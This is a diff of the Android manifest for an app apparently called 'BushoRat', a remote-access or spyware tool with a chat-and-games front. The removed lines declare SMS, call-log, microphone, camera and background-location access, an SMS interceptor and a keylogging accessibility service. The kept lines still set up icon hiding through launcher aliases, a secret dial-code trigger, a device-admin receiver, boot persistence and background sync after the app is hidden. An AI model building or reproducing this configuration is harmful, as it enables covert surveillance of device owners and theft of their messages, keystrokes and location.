@@ -1,74 +1,33 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools"
-    package="com.bushorat.chatapp">
+    package="com.busho.app">
 
-    <uses-feature
-        android:name="android.hardware.telephony"
-        android:required="false" />
-
-    <!-- Storage Permissions -->
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
-    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
-    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
-    <uses-permission android:name="android.permission.READ_MEDIA_DOCUMENTS" />
-    <uses-permission android:name="android.permission.READ_MEDIA_VISUAL_USER_SELECTED" />
-    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
-    
-    <!-- Camera & Audio Permissions -->
-    <uses-permission android:name="android.permission.CAMERA" />
-    <uses-permission android:name="android.permission.RECORD_AUDIO" />
-    
-    <!-- Contacts Permissions -->
+    <!-- Contacts -->
     <uses-permission android:name="android.permission.READ_CONTACTS" />
-    <uses-permission android:name="android.permission.WRITE_CONTACTS" />
-    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
-    
-    <!-- Phone Permissions -->
-    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
-    <uses-permission android:name="android.permission.READ_CALL_LOG" />
-    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
-    <uses-permission android:name="android.permission.CALL_PHONE" />
-    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
-    
-    <!-- SMS Permissions -->
-    <uses-permission android:name="android.permission.READ_SMS" />
-    <uses-permission android:name="android.permission.SEND_SMS" />
-    <uses-permission android:name="android.permission.RECEIVE_SMS" />
-    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
-    
-    <!-- Location Permissions -->
+
+    <!-- Location -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
-    
-    <!-- Calendar Permissions -->
-    <uses-permission android:name="android.permission.READ_CALENDAR" />
-    <uses-permission android:name="android.permission.WRITE_CALENDAR" />
-    
-    <!-- Network & Internet -->
-    <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
-    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+
+    <!-- File manager / storage -->
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"
+        tools:ignore="ScopedStorage" />
 
     <!-- Notifications -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
-    <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT" />
+
+    <!-- Network + keep-alive for background sync after hide -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
-    
-    <!-- Service Permissions -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
-    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
-    
-    <!-- Other Permissions -->
-    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
     <uses-permission android:name="android.permission.VIBRATE" />
-    <!-- Restart OEM home launcher so ghost icons drop after component disable (OnePlus). -->
     <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES" />
 
     <queries>
@@ -90,87 +49,37 @@
         android:theme="@style/Theme.BushoRat"
         android:requestLegacyExternalStorage="true"
         tools:targetApi="31">
+
         <activity
-            android:name=".activities.ConnectingActivity"
-            android:exported="false" />
-        <activity
-            android:name=".activities.IncomingCallActivity"
-            android:exported="false"
-            android:launchMode="singleTop"
-            android:showWhenLocked="true"
-            android:turnScreenOn="true"
-            android:excludeFromRecents="true"
-            android:taskAffinity="" />
-        <activity
-            android:name=".activities.CallActivity"
-            android:exported="false"
-            android:configChanges="keyboard|keyboardHidden|orientation|screenSize|screenLayout|smallestScreenSize"
-            android:launchMode="singleTop"
-            android:resizeableActivity="true"
-            android:supportsPictureInPicture="true"
-            android:windowSoftInputMode="adjustResize" />
-        <activity
-            android:name=".activities.WebViewActivity"
-            android:exported="false" />
-        <activity
-            android:name=".activities.BalloonPopperActivity"
+            android:name=".activities.SetupPermissionsActivity"
             android:exported="false"
             android:theme="@style/Theme.BushoRat" />
-        <activity
-            android:name=".activities.ColorTapGameActivity"
-            android:exported="false" />
-        <activity
-            android:name=".activities.MemoryGameActivity"
-            android:exported="false" />
-        <activity
-            android:name=".activities.MathQuizActivity"
-            android:exported="false" />
-        <activity
-            android:name=".activities.TapGameActivity"
-            android:exported="false" />
-        <activity
-            android:name=".activities.EarnActivity"
-            android:exported="false" />
-        <activity
-            android:name=".activities.ChatActivity"
-            android:exported="false"
-            android:launchMode="singleTask"
-            android:configChanges="orientation|screenSize|keyboardHidden" />
-        <activity
-            android:name=".activities.VideoPlayerActivity"
-            android:exported="false" />
-        <activity
-            android:name=".activities.PornActivity"
-            android:exported="false" />
-        <!-- LoginActivity launcher declared below -->
-        <activity
-            android:name=".activities.SignupActivity"
-            android:exported="false" />
-        <activity
-            android:name=".activities.ProfileActivity"
-            android:exported="false" />
-        <activity
-            android:name=".activities.DashboardActivity"
-            android:exported="false" />
-        <activity
-            android:name=".activities.RegisterGoogleActivity"
-            android:exported="false" />
-        <activity
-            android:name=".activities.RegisterFacebookActivity"
-            android:exported="false" />
+
         <activity
             android:name=".activities.ChooseLoginActivity"
             android:exported="false"
             android:enabled="true" />
 
-        <!-- Target only — LAUNCHER lives on aliases so we can blank-swap then disable (OnePlus ghost fix). -->
         <activity
-            android:name="com.bushorat.chatapp.MainLauncherActivity"
+            android:name=".activities.SecretLauncherActivity"
+            android:exported="false"
+            android:theme="@style/Theme.BushoRat" />
+
+        <activity
+            android:name=".activities.ProfileActivity"
+            android:exported="false" />
+
+        <activity
+            android:name=".activities.DashboardActivity"
+            android:exported="false" />
+
+        <!-- Target only — LAUNCHER on aliases (existing hide path). -->
+        <activity
+            android:name="com.busho.app.MainLauncherActivity"
             android:enabled="true"
             android:exported="true"
             android:theme="@style/Theme.BushoRat.Launcher" />
 
-        <!-- Normal home-screen icon. -->
         <activity-alias
             android:name=".VisibleLauncherAlias"
             android:enabled="true"
@@ -178,14 +87,13 @@
             android:icon="@mipmap/ic_launcher"
             android:label="@string/app_name"
             android:roundIcon="@mipmap/ic_launcher_round"
-            android:targetActivity="com.bushorat.chatapp.MainLauncherActivity">
+            android:targetActivity="com.busho.app.MainLauncherActivity">
             <intent-filter android:priority="999">
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity-alias>
 
-        <!-- Temporary blank tile so OxygenOS updates/clears the cached branded icon before full disable. -->
         <activity-alias
             android:name=".BlankLauncherAlias"
             android:enabled="false"
@@ -193,25 +101,12 @@
             android:icon="@drawable/ic_launcher_blank"
             android:label="@string/launcher_blank_label"
             android:roundIcon="@drawable/ic_launcher_blank"
-            android:targetActivity="com.bushorat.chatapp.MainLauncherActivity">
+            android:targetActivity="com.busho.app.MainLauncherActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity-alias>
-
-        <activity
-            android:name=".activities.LoginActivity"
-            android:exported="false" />
-
-        <activity
-            android:name=".activities.SecretLauncherActivity"
-            android:exported="false"
-            android:theme="@style/Theme.BushoRat" />
-        
-        <activity
-            android:name=".MainActivity"
-            android:exported="false" />
 
         <receiver
             android:name=".reciever.AppProtectionDeviceAdminReceiver"
@@ -237,14 +132,6 @@
         </receiver>
 
         <receiver
-            android:name=".reciever.SMSReceiver"
-            android:exported="true">
-            <intent-filter android:priority="1000">
-                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
-            </intent-filter>
-        </receiver>
-
-        <receiver
             android:name=".reciever.BootReceiver"
             android:enabled="true"
             android:exported="true">
@@ -263,27 +150,6 @@
                 <data android:scheme="android_secret_code" android:host="737826" />
             </intent-filter>
         </receiver>
-
-        <service
-            android:name="com.bushorat.chatapp.services.NotificationListenerService"
-            android:exported="true"
-            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
-            <intent-filter>
-                <action android:name="android.service.notification.NotificationListenerService" />
-            </intent-filter>
-        </service>
-
-        <service
-            android:name=".services.KeylogAccessibilityService"
-            android:exported="true"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService" />
-            </intent-filter>
-            <meta-data
-                android:name="android.accessibilityservice"
-                android:resource="@xml/keylog_accessibility_service" />
-        </service>
 
         <service
             android:name=".services.BackgroundMaintenanceService"
